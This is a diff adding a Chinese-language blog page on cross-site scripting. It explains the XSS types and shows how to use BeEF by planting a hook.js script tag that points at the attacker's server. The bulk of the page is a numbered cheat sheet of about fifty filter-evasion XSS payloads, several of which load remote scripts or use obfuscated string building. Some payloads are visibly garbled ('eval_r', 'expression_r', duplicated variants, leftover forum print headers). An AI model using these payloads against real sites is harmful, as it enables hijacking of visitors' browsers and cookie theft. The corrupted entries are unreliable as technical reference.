@@ -1,0 +1,453 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XSS - Guoyanan</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Expect Us,XSS简介​    跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中的Script代码会被执行，从而达到恶意攻击用户的目的。
+​    当目标网站目标用户,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Guoyanan" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Guoyanan</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">XSS</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">XSS</h1>
+        <div class="stuff">
+            <span>九月 19, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>​    跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>​    当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。<br>​     xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以很多xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。<br> 常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code></p>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p><strong>反射型XSS：</strong></p>
+<p>​        <code>发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS</code></p>
+<p>​     攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+<p><img src="https://s1.ax1x.com/2020/09/12/waBCDS.png" alt=""></p>
+<p>​    例如：</p>
+<p><code>http://www.a.com/xss/reflect.php</code>的代码为<code>&lt;?php echo $_GET[&#39;X&#39;];?&gt;</code>，那么，可以提交<code>http://www.a.com/xss/reflect.php?X=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>来达到一个简单的XSS反射。</p>
+<p><strong>存储型XSS：</strong></p>
+<p>​         代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p>
+<p><img src="https://s1.ax1x.com/2020/09/12/waGmwt.png" alt=""></p>
+<p>​        最典型的例子是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与Js解析执行，于是触发了XSS攻击。</p>
+<p>​    (测试网站：<code>http://emiriat.com/default.html</code>)</p>
+<p><strong>DOM型XSS：</strong></p>
+<p>​        <code>DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。</code></p>
+<p>​        基于<code>文档对象模型(Document Object Model，DOM)</code>的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p>
+<p><img src="https://s1.ax1x.com/2020/09/12/wdnP9s.png" alt=""></p>
+<p>​    例如：</p>
+<p>​    <code>http://www.a.com/xss/domxss.html</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码为：</span><br><span class="line">&lt;script&gt;</span><br><span class="line">eval(location.hash.substr(1)); </span><br><span class="line">&#x2F;&#x2F;Location 对象包含有关当前 URL 的信息。hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>触发方式为：<code>http://www.a.com/xss/domxss.html#alert(1)   //URL#后的内容是不会发送到服务器端的，仅仅在客户端被接收并解执行。</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常见注入点：</span><br><span class="line">document.URL</span><br><span class="line">document.URLUnencoded</span><br><span class="line">document.location</span><br><span class="line">document.referrer</span><br><span class="line">window.location</span><br><span class="line">window.name</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="XSS辅助工具——BeEF"><a href="#XSS辅助工具——BeEF" class="headerlink" title="XSS辅助工具——BeEF"></a>XSS辅助工具——BeEF</h2><p>​    BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，<code>Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。</code></p>
+<p>​    BeEF主要是往网页中插入一段名为<code>hook.js</code>的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。</p>
+<p>​    BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， <code>BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。</code>BeEF一般和XSS漏洞结合使用。</p>
+<p>​    <strong>由于beef是kali自带的，所以直接打开kali，点击beef start开启beef。</strong></p>
+<p>​    <strong>登录后，将<script src='http://IP（运行beef主机的IP）:3000/hook.js'></script>插入存在xss漏洞的表单中。    之后beef界面就会出现浏览信息部分，显示访问者的IP，本机访问的虚拟机，显示的是网关的IP</strong></p>
+<p>​    <strong>当他人点击后，可以根据需求将页面跳转到其他网址，也可以根据需求，用beef将网址自动跳转到指定的URL</strong></p>
+<h2 id="XSS的实际利用"><a href="#XSS的实际利用" class="headerlink" title="XSS的实际利用"></a>XSS的实际利用</h2><p>除了弹窗之外，XSS的危害是巨大的：</p>
+<p>1、针对性挂马</p>
+<p>2、用户权限下操作</p>
+<p>​    这类网站则必须有会员，而且这些会员有很多有意义的操作或者有内部个人资料，所以可以通过XSS对已登录访问者进行有权限操作。例如cookies的盗取，因为其目的也是获取用户操作权限(盗密码包括在内)，从而获取用户某些信息或者进行权限下的相关操作。</p>
+<p>3、Dos攻击或傀儡机 　</p>
+<p>​    这同样需要一个访问量非常大的站点，我们可以通过此页的访问用户不间断地攻击其他站点，或者进行局域网扫描等等。这类js工具早已经产生，js端口扫描、jikto、xssshell等等。 　</p>
+<p>4、提权 　</p>
+<p>​    一般这主要发生在论坛或信息管理系统，要有管理员权限。这需要攻击者对目标系统相当熟悉(一般这样的系统需要开源代码)，从而知道怎样构造语句进行提权。 　</p>
+<p>5、实现特殊效果</p>
+<h3 id="常见的XSS攻击方法"><a href="#常见的XSS攻击方法" class="headerlink" title="常见的XSS攻击方法"></a>常见的XSS攻击方法</h3><p>(1)普通的XSS js注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC&#x3D;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js&gt;&lt;&#x2F;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">当提交方式为一个input输入框时，提交的值在value&#x3D;“ ”里，需要闭合标签，即&quot;&gt;&lt;script&gt;alert(&#39;1&#39;)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">ON事件触发：  onclick&#x3D;alert(1)     &#x3D;&gt;点击就会触发</span><br><span class="line">			onmouseover&#x3D;alert(1) &#x3D;&gt;鼠标移动触发</span><br><span class="line">			onfocus&#x3D;alert(1) autofocus&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>(2)IMG标签XSS使用JavaScript命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(3)IMG标签无分号无引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;javascript:alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(4)IMG标签大小写不敏感</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(5)HTML编码(必须有分号)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;javascript:alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(6)修正缺陷IMG标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCRIPT&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(7)formCharCode标签(计算器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(8)UTF-8的Unicode编码(计算器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;jav..省略..S&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;jav..省略..S&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(10)十六进制编码也是没有分号(计算器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(11)嵌入式标签,将Javascript分开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(12)嵌入式编码标签,将Javascript分开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(13)嵌入式换行符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(14)嵌入式回车</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;jav ascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(16)解决限制字符(要求同页面)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z&#x3D;&#39;document.&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;write(&quot;&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;&lt;script&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39; src&#x3D;ht&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;tp:&#x2F;&#x2F;ww&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;w.shell&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;.net&#x2F;1.&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;js&gt;&lt;&#x2F;sc&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;ript&gt;&quot;)&#39;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;eval_r(z)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(17)空字符12-7-1 T00LS - Powered by Discuz! Board</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.a.com&#x2F;viewthread.php?action&#x3D;printable&amp;tid&#x3D;15267 2&#x2F;6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">perl -e &#39;print &quot;&lt;IMG SRC&#x3D;java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39; &gt; out</span><br></pre></td></tr></table></figure>
+
+<p>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;&#x2F;SCR\0IPT&gt;&quot;;&#39; &gt; out</span><br></pre></td></tr></table></figure>
+
+<p>(19)Spaces和meta前的IMG标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot; javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(20)Non-alpha-non-digit XSS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&#x2F;XSS SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(21)Non-alpha-non-digit XSS to 2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[&#x2F;|\]^&#96;&#x3D;alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(22)Non-alpha-non-digit XSS to 3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&#x2F;SRC&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js&quot;&gt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(23)双开括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&#x2F;&#x2F;&lt;&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(24)无结束脚本标记(仅火狐等浏览器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC&#x3D;http:&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js?&lt;B&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(25)无结束脚本标记2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC&#x3D;&#x2F;&#x2F;3w.org&#x2F;XSS&#x2F;xss.js&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(26)半开的HTML/JavaScript XSS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(27)双开角括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;3w.org&#x2F;XSS.html &lt;</span><br></pre></td></tr></table></figure>
+
+<p>(28)无单引号 双引号 分号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;a&#x3D;&#x2F;XSS&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert(a.source)&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(29)换码过滤的JavaScript</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;;alert(&#39;XSS&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>(30)结束Title标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(31)Input Image</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(32)BODY Image</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY BACKGROUND&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(33)BODY标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(34)IMG Dynsrc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG DYNSRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(35)IMG Lowsrc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG LOWSRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(36)BGSOUND</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BGSOUND SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(37)STYLE sheet</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL&#x3D;&quot;stylesheet&quot; HREF&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(38)远程样式表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL&#x3D;&quot;stylesheet&quot; HREF&#x3D;&quot;http:&#x2F;&#x2F;3w.org&#x2F;xss.css&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(39)List-style-image(列表式)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);&#125;&lt;&#x2F;STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
+
+<p>(40)IMG VBscript</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC&#x3D;&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;&gt;&lt;&#x2F;STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br></pre></td></tr></table></figure>
+
+<p>(41)META链接url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV&#x3D;&quot;refresh&quot; CONTENT&#x3D;&quot;0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL&#x3D;http:&#x2F;&#x2F;;URL&#x3D;javascript:alert(&#39;XSS&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(42)Iframe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IFRAME SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;&#x2F;IFRAME&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(43)Frame</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC&#x3D;&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;&lt;&#x2F;FRAMESET&gt;12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.a.com&#x2F;viewthread.php?action&#x3D;printable&amp;tid&#x3D;15267 3&#x2F;6</span><br></pre></td></tr></table></figure>
+
+<p>(44)Table</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE BACKGROUND&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(45)TD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND&#x3D;&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(46)DIV background-image</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE&#x3D;&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-<br>8&amp;13&amp;12288&amp;65279)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE&#x3D;&quot;background-image: url(javascript:alert(&#39;XSS&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(48)DIV expression</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE&#x3D;&quot;width: expression_r(alert(&#39;XSS&#39;));&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(49)STYLE属性分拆表达</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG STYLE&#x3D;&quot;xss:expression_r(alert(&#39;XSS&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(50)匿名STYLE(组成:开角号和一个字母开头)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XSS STYLE&#x3D;&quot;xss:expression_r(alert(&#39;XSS&#39;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(51)STYLE background-image</p>
